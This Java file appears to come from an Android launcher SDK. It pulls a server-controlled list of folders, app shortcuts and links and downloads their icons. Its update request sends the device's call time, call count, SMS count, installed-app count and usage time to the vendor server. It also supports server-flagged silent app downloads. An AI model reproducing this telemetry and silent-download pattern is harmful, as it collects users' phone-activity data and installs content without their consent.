package cool.sdk.DynamicEntry;


import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;

import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.util.Log;

import com.cooee.framework.config.defaultConfig.BaseDefaultConfig;
import com.cooee.framework.function.DynamicEntry.OperateDynamicProxy;
import com.cooee.framework.utils.StringUtils;

import cool.sdk.SAManager.SACoolDLMgr;
import cool.sdk.SAManager.SACoolDLMgr.DownloadItem;
import cool.sdk.SAManager.SAHelper;
import cool.sdk.SAManager.SAService;
import cool.sdk.common.CoolHttpClient;
import cool.sdk.common.CoolHttpClient.ResultEntity;
import cool.sdk.common.CoolMethod;
import cool.sdk.common.JsonUtil;
import cool.sdk.common.UrlUtil;
import cool.sdk.download.CoolDLCallback;
import cool.sdk.download.CoolDLMgr;
import cool.sdk.download.CoolDLResType;
import cool.sdk.download.manager.dl_cb;
import cool.sdk.download.manager.dl_info;
import cool.sdk.download.manager.dl_result;
import cool.sdk.update.manager.UpdateConfig;
import cool.sdk.update.manager.UpdateHelper;


public abstract class DynamicEntryUpdate extends UpdateHelper
{
	
	static UpdateConfig config;
	static
	{
		config = new UpdateConfig();
		config.UPDATE_DEFAULT_MINUTES = 1 * 24 * 60;// 默认更新间隔
		config.UPDATE_MIN_MINUTES = 8 * 60;// 最小更新间隔
		config.UPDATE_MAX_MINUTES = 15 * 24 * 60;// 最大更新间隔
		config.MAX_UPDATE_TIMES_PER_DAY = 3;// 每天最大更新次数
		config.RETRY_TIMES_WHEN_ONLINE = 3;//有网络下的重试次数
	};
	protected Context context;
	//	protected CoolLog Log;
	static final float CONST_SUCCESS_RATE = 0.7f;
	
	protected DynamicEntryUpdate(
			Context context )
	{
		super( context , DynamicEntry.h13 , config );
		// TODO Auto-generated constructor stub
		this.context = context;
		//		Log = new CoolLog( context );
	}
	
	public abstract void OnDataChange() throws Exception;
	
	public abstract String getEntryID() throws Exception;
	
	static DynamicEntryUpdate instance = null;
	private static final String ACTION_FOLDER_REQUEST = "3300";
	public static final int PLAFORM_VERSION = 1;
	public static final String DEFAULT_VERSION = "0";
	
	abstract class MyIconCoolDLCallback extends dl_cb implements CoolDLCallback
	{
		
		public int successCount = 0;//本次成功个数
		public int failCount = 0;//本次失败个数
		public int downloadCount = 0;//本次下载个数
		public int totalCount = 0;//总个数
	}
	
	CoolDLMgr dlMgrIcon;
	Object dlMgrIconSync = new Object();
	
	public CoolDLMgr getCoolDLMgrIcon()
	{
		synchronized( dlMgrIconSync )
		{
			if( dlMgrIcon == null )
			{
				dlMgrIcon = DynamicEntry.CoolDLMgr( context , "DICON" );
				dlMgrIcon.dl_mgr.setMaxConnectionCount( 3 );
				dlMgrIcon.dl_mgr.setDownloadPath( dlMgrIcon.getInternalPath() );
				dlMgrIcon.setCheckPathEverytime( false );
			}
		}
		return dlMgrIcon;
	}
	
	public String getListString()
	{
		return getString( "resJson.toString()" );
	}
	
	public String getListVersion()
	{
		return getString( "c3" , DEFAULT_VERSION );
	}
	
	public boolean allowSilentDownload()
	{
		long flag = getLong( "c4" , 0L );
		return ( flag & ( 0x1 ) ) == 0x1;
	}
	
	public Set<DownloadItem> getSilentDownloadList()
	{
		Set<DownloadItem> items = new HashSet<DownloadItem>();
		String resJson_toString = getListString();
		//取存储的配置
		if( resJson_toString != null && resJson_toString.length() > 0 )
		{
			try
			{
				JSONObject list = new JSONObject( resJson_toString );
				Iterator<?> keys = (Iterator<?>)list.keys();
				while( keys.hasNext() )
				{
					String key = (String)keys.next();
					JSONObject item = list.getJSONObject( key );
					//	r1	list	数字	入口ID [入口ID是客户端标示或者定位入口的唯一ID。]
					//  r2  list    类型：1：文件夹 2：应用程序 3：网页链接
					//	r3	list	对象，字符	英文名称
					//	r4	list	对象，字符	中文名称
					//	r5	list	对象，字符	繁体名称
					//	r6	list	对象，数字	应用程序列表 0:不显示 1:显示
					//	r7	list	对象，数字	桌面 0:不显示 1:显示
					//	r8	list	对象，数字	快捷方式显示屏幕位置x
					//	r9	list	对象，数字	快捷方式显示屏幕位置y
					//	r10	list	对象，字符	图标地址url
					//	r11	list	对象，字符	网页链接入口url地址或packname
					//  r12	r1	对象，数字	N标是否显示（0：不显示，1显示）
					int r1 = item.getInt( "r1" );
					int r2 = item.getInt( "r2" );
					String r3 = item.getString( "r3" );
					String r4 = item.getString( "r4" );
					String r5 = item.getString( "r5" );
					int r6 = item.getInt( "r6" );
					int r7 = item.getInt( "r7" );
					int r8 = item.getInt( "r8" );
					int r9 = item.getInt( "r9" );
					String r10 = item.getString( "r10" );
					String r11 = item.getString( "r11" );
					int r12 = item.getInt( "r12" );
					if( item.has( "folder" ) )
					{
						JSONArray folders = item.getJSONArray( "folder" );
						//	f0	folder	对象，字符	类型：2：应用程序 3：网页链接
						//	f1	folder	对象，字符	网页链接入口url地址或packname
						//	f2	folder	对象，字符	下载的时候文字提示
						//	f3	folder	对象，字符	应用版本号
						//	f4	folder	对象，字符	版本名称
						//	f5	folder	对象，数字	APK 文件大小
						//	f6	folder	对象，字符	中文名
						//	f7	folder	对象，字符	英文名
						//	f8	folder	对象，字符	繁体名
						//	f9	folder	对象，字符	icon
						//	f10	folder	数字	flag
						for( int j = 0 ; j < folders.length() ; j++ )
						{
							JSONObject folder = folders.getJSONObject( j );
							int f0 = folder.getInt( "f0" );
							String f1 = folder.getString( "f1" );
							String f2 = folder.getString( "f2" );
							String f3 = folder.getString( "f3" );
							String f4 = folder.getString( "f4" );
							int f5 = folder.getInt( "f5" );
							String f6 = folder.getString( "f6" );
							String f7 = folder.getString( "f7" );
							String f8 = folder.getString( "f8" );
							String f9 = folder.getString( "f9" );
							int f10 = folder.getInt( "f10" );
							if( f0 == 2 )//应用程序
							{
								if( f1 != null )
								{
									if( ( f10 & 0x1 ) == 0x1 )
									{
										items.add( new DownloadItem( f1 , f7 , f6 , f8 , DynamicEntry.h12 , DynamicEntry.h13 ) );
									}
								}
							}
						}
					}
				}
			}
			catch( Exception e )
			{
				// TODO Auto-generated catch block
			}
		}
		return items;
	}
	
	@Override
	protected boolean OnUpdate(
			final Context context ) throws Exception
	{
		// TODO Auto-generated method stub
		if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
			Log.v( "COOL" , "OnUpdate" );
		DynamicEntryLog.applyLogDynamicEntryClickArray( context );
		JSONObject reqJson = JsonUtil.NewRequestJSON( context , DynamicEntry.h12 , DynamicEntry.h13 );
		reqJson.put( "Action" , ACTION_FOLDER_REQUEST );
		reqJson.put( "p1" , CoolMethod.getTotalCallTime( context ) );
		reqJson.put( "p2" , CoolMethod.getCallTimes( context ) );
		reqJson.put( "p3" , CoolMethod.getSmsNum( context ) );
		reqJson.put( "p4" , getString( "c2" , DEFAULT_VERSION ) );//配置时间戳
		reqJson.put( "p5" , getString( "c3" , DEFAULT_VERSION ) );//列表时间戳（就是列表文件版本号）
		reqJson.put( "p6" , PLAFORM_VERSION );//动态入口平台版本号
		reqJson.put( "p7" , getEntryID() );//显示入口ID
		reqJson.put( "p8" , CoolMethod.getInstallAppCount( context ) );//安装应用个数
		reqJson.put( "p9" , CoolMethod.getAppActiveTime( context ) );//应用激活时间
		reqJson.put( "p10" , CoolMethod.getPhoneTotalUseTime( context ) );//手机总开机时间
		if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
			Log.v( "COOL" , StringUtils.concat( "DynamicEntryUpdate req:" , reqJson.toString() ) );
		ResultEntity result = CoolHttpClient.postEntity( UrlUtil.getDataServerUrl() , reqJson.toString() );
		if( result.exception != null )
		{
			if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
				Log.v( "COOL" , StringUtils.concat( "DynamicEntryUpdate rsp:(error),httpCode:" , result.httpCode , "-exception:" , result.exception.toString() ) );
			return false;
		}
		if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
			Log.v( "COOL" , StringUtils.concat( "DynamicEntryUpdate rsp,httpCode:" , result.httpCode , "-content:" , result.content ) );
		JSONObject resJson = new JSONObject( result.content );
		int rc0 = resJson.getInt( "rc0" );
		int rl0 = resJson.getInt( "rl0" );
		if( rc0 == 0 )
		{
			JSONObject config = resJson.getJSONObject( "config" );
			if( config.has( "c0" ) )//免责标识
			{
				String c0 = config.getString( "c0" );
				setValue( "c0" , c0 );
				if( OperateDynamicProxy.context != null )
				{
					OperateDynamicProxy.getInstance().setDisclaimer( c0 );
				}
			}
			if( config.has( "c1" ) )//更新间隔，同文件夹的参数
			{
				setGapMinute( config.getInt( "c1" ) );
			}
			if( config.has( "c2" ) )//配置时间戳
			{
				setValue( "c2" , config.getString( "c2" ) );
			}
			if( config.has( "c4" ) )//WIFI
			{
				setValue( "c4" , config.getString( "c4" ) );
			}
		}
		else if( rc0 == 200 )
		{
			setGapMinute( config.UPDATE_DEFAULT_MINUTES );
			setValue( "c2" , DEFAULT_VERSION );
		}
		else if( rc0 == 100 )
		{
			String c0 = getString( "c0" );
			if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
				Log.v( "Dynamic " , StringUtils.concat( "Dynamic rc100 OperateDynamicProxy:" + OperateDynamicProxy.context , ",c0:" , c0 ) );
			if( OperateDynamicProxy.context != null )
			{
				OperateDynamicProxy.getInstance().setDisclaimer( c0 );
			}
		}
		JSONObject list = null;
		boolean operatePeriodChange = false;
		do
		{
			if( rl0 == 0 )
			{
				//取服务器的配置
				if( resJson.has( "list" ) )
				{
					list = resJson.getJSONObject( "list" );
					//保存服务器的配置
					setValue( "resJson.toString()" , list.toString() );
				}
				JSONObject config = resJson.getJSONObject( "config" );
				if( config.has( "c3" ) )//列表时间戳
				{
					setValue( "c3" , config.getString( "c3" ) );
					DynamicEntryLog.LogConfigComplete( context , config.getString( "c3" ) );
					operatePeriodChange = true;
				}
				break;
			}
			else if( rl0 == 100 )
			{
				String resJson_toString = getListString();
				//取存储的配置
				if( resJson_toString != null && resJson_toString.length() > 0 )
				{
					list = new JSONObject( resJson_toString );
					break;
				}
			}
			else if( rl0 == 200 )
			{
				//清空服务器的配置
				setValue( "resJson.toString()" , (String)null );
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , "onMyClear!" );
				setValue( "c3" , DEFAULT_VERSION );
				OnDataChange();
				return true;
			}
			list = null;
		}
		while( false );
		if( operatePeriodChange )
		{
			if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
				Log.v( "SA" , "protocol Update: operatePeriodChange" );
			SAHelper.getInstance( context ).checkNotify( SACoolDLMgr.FLAG_CHECK_OPERATE_PERIOD_CHANGE );
		}
		if( list != null )
		{
			checkDynamicEntryIcon( list , rl0 , true , operatePeriodChange );
		}
		return true;
	}
	
	public void checkDynamicEntryIcon()
	{
		try
		{
			String resJson_toString = getListString();
			//取存储的配置
			if( resJson_toString == null || resJson_toString.isEmpty() )
			{
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , "DynamicEntry checkDynamicEntryIcon no need" );
				return;
			}
			if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
				Log.v( "COOL" , "DynamicEntry checkDynamicEntryIcon start" );
			checkDynamicEntryIcon( new JSONObject( resJson_toString ) , 100 , false , false );
		}
		catch( Exception e )
		{
			// TODO: handle exception
		}
	}
	
	private synchronized void checkDynamicEntryIcon(
			final JSONObject list ,
			int rl0 ,
			final boolean checkSilent ,
			boolean operatePeriodChange ) throws Exception
	{
		getCoolDLMgrIcon();
		Set<String> urlSet = new HashSet<String>();
		Set<String> pkgSet = new HashSet<String>();
		Iterator<?> keys = (Iterator<?>)list.keys();
		while( keys.hasNext() )
		{
			String key = (String)keys.next();
			JSONObject item = list.getJSONObject( key );
			//	r1	list	数字	入口ID [入口ID是客户端标示或者定位入口的唯一ID。]
			//  r2  list    类型：1：文件夹 2：应用程序 3：网页链接
			//	r3	list	对象，字符	英文名称
			//	r4	list	对象，字符	中文名称
			//	r5	list	对象，字符	繁体名称
			//	r6	list	对象，数字	应用程序列表 0:不显示 1:显示
			//	r7	list	对象，数字	桌面 0:不显示 1:显示
			//	r8	list	对象，数字	快捷方式显示屏幕位置x
			//	r9	list	对象，数字	快捷方式显示屏幕位置y
			//	r10	list	对象，字符	图标地址url
			//	r11	list	对象，字符	网页链接入口url地址或packname
			//  r12	r1	对象，数字	N标是否显示（0：不显示，1显示）
			int r1 = item.getInt( "r1" );
			int r2 = item.getInt( "r2" );
			String r3 = item.getString( "r3" );
			String r4 = item.getString( "r4" );
			String r5 = item.getString( "r5" );
			int r6 = item.getInt( "r6" );
			int r7 = item.getInt( "r7" );
			int r8 = item.getInt( "r8" );
			int r9 = item.getInt( "r9" );
			String r10 = item.getString( "r10" );
			String r11 = item.getString( "r11" );
			int r12 = item.getInt( "r12" );
			if( r10 != null )
			{
				if( !urlSet.contains( r10 ) )
				{
					urlSet.add( r10 );
				}
			}
			if( item.has( "folder" ) )
			{
				JSONArray folders = item.getJSONArray( "folder" );
				//	f0	folder	对象，字符	类型：2：应用程序 3：网页链接
				//	f1	folder	对象，字符	网页链接入口url地址或packname
				//	f2	folder	对象，字符	下载的时候文字提示
				//	f3	folder	对象，字符	应用版本号
				//	f4	folder	对象，字符	版本名称
				//	f5	folder	对象，数字	APK 文件大小
				//	f6	folder	对象，字符	中文名
				//	f7	folder	对象，字符	英文名
				//	f8	folder	对象，字符	繁体名
				//	f9	folder	对象，字符	icon
				for( int j = 0 ; j < folders.length() ; j++ )
				{
					JSONObject folder = folders.getJSONObject( j );
					int f0 = folder.getInt( "f0" );
					String f1 = folder.getString( "f1" );
					String f2 = folder.getString( "f2" );
					String f3 = folder.getString( "f3" );
					String f4 = folder.getString( "f4" );
					int f5 = folder.getInt( "f5" );
					String f6 = folder.getString( "f6" );
					String f7 = folder.getString( "f7" );
					String f8 = folder.getString( "f8" );
					String f9 = folder.getString( "f9" );
					if( f0 == 2 )//应用程序
					{
						if( f1 != null )
						{
							if( !pkgSet.contains( f1 ) )
							{
								pkgSet.add( f1 );
							}
						}
					}
					else if( f0 == 3 )//网页链接
					{
						if( f9 != null )
						{
							if( !urlSet.contains( f9 ) )
							{
								urlSet.add( f9 );
							}
						}
					}
				}
			}
		}
		MyIconCoolDLCallback iconDownloadCB = new MyIconCoolDLCallback() {
			
			static final float successRate = CONST_SUCCESS_RATE;
			
			private void mySuccessCheck()
			{
				if( successCount + failCount != downloadCount )
				{
					return;
				}
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , StringUtils.concat(
							"DynamicEntry successCount:" ,
							successCount ,
							"-failCount:" ,
							failCount ,
							"-downloadCount:" ,
							downloadCount ,
							"-totalCount:" ,
							totalCount ,
							"-percent:" ,
							( 1.0f - (float)failCount / (float)totalCount ) ) );
				if( (float)failCount / (float)totalCount > 1.0f - successRate )
				{
					if( OperateDynamicProxy.context != null )
					{
						OperateDynamicProxy.getInstance().processDisclaimer();
					}
					return;
				}
				if( checkSilent )
				{
					SAService.doCheck( context );
				}
				try
				{
					OnDataChange();
				}
				catch( Exception e )
				{
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
			
			@Override
			public synchronized void onSuccess(
					CoolDLResType type ,
					String name ,
					dl_info info )
			{
				// TODO Auto-generated method stub
				successCount++;
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , StringUtils.concat( "DynamicEntry iconDownloadCB success:" , name ) );
				mySuccessCheck();
			}
			
			@Override
			public synchronized void onFail(
					CoolDLResType type ,
					String name ,
					dl_info info )
			{
				// TODO Auto-generated method stub
				failCount++;
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , StringUtils.concat( "DynamicEntry iconDownloadCB fail:" , name ) );
				mySuccessCheck();
			}
			
			@Override
			public void onDoing(
					CoolDLResType type ,
					String name ,
					dl_info info )
			{
				// TODO Auto-generated method stub
			}
			
			@Override
			public void onStart(
					dl_info info ) throws Exception
			{
				// TODO Auto-generated method stub
			}
			
			@Override
			public void onDoing(
					dl_info info ) throws Exception
			{
				// TODO Auto-generated method stub
			}
			
			@Override
			public synchronized void onSuccess(
					dl_info info ) throws Exception
			{
				// TODO Auto-generated method stub
				successCount++;
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , StringUtils.concat( "DynamicEntry iconDownloadCB success:" , info.getURL() ) );
				mySuccessCheck();
			}
			
			@Override
			public synchronized void onFail(
					dl_result result ,
					dl_info info ) throws Exception
			{
				// TODO Auto-generated method stub
				failCount++;
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , StringUtils.concat( "DynamicEntry iconDownloadCB fail:" , info.getURL() ) );
				mySuccessCheck();
			}
		};
		iconDownloadCB.totalCount = urlSet.size() + pkgSet.size();
		//处理url图标
		Iterator<String> iterator = urlSet.iterator();
		while( iterator.hasNext() )
		{
			String url = iterator.next();
			//下载url图标
			dl_info info = dlMgrIcon.UrlGetInfo( url );
			if( info == null || !info.IsDownloadSuccess() )
			{
				iconDownloadCB.downloadCount++;
			}
			else
			{
				iterator.remove();
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , StringUtils.concat( "DynamicEntry iconDownloadCB already exists:" , url ) );
			}
		}
		//处理应用图标
		iterator = pkgSet.iterator();
		while( iterator.hasNext() )
		{
			String pkg = iterator.next();
			//下载应用图标
			dl_info info = dlMgrIcon.IconGetInfo( pkg , CoolDLMgr.ICON_default , false );
			if( info == null || !info.IsDownloadSuccess() )
			{
				iconDownloadCB.downloadCount++;
			}
			else
			{
				iterator.remove();
				if( BaseDefaultConfig.SWITCH_ENABLE_DEBUG )
					Log.v( "COOL" , StringUtils.concat( "DynamicEntry iconDownloadCB success:" , pkg ) );
			}
		}
		for( String url : urlSet )
		{
			dlMgrIcon.UrlDownload( url , iconDownloadCB );
		}
		for( String pkg : pkgSet )
		{
			dlMgrIcon.IconDownload( pkg , CoolDLMgr.ICON_default , iconDownloadCB );
		}
		if( iconDownloadCB.totalCount == 0 )
		{
			if( checkSilent && operatePeriodChange )
			{
				SAService.doCheck( context );
			}
			OnDataChange();
		}
		else if( iconDownloadCB.totalCount > 0 && iconDownloadCB.downloadCount == 0 && rl0 == 0 )
		{
			if( checkSilent && operatePeriodChange )
			{
				SAService.doCheck( context );
			}
			OnDataChange();
		}
	}
}
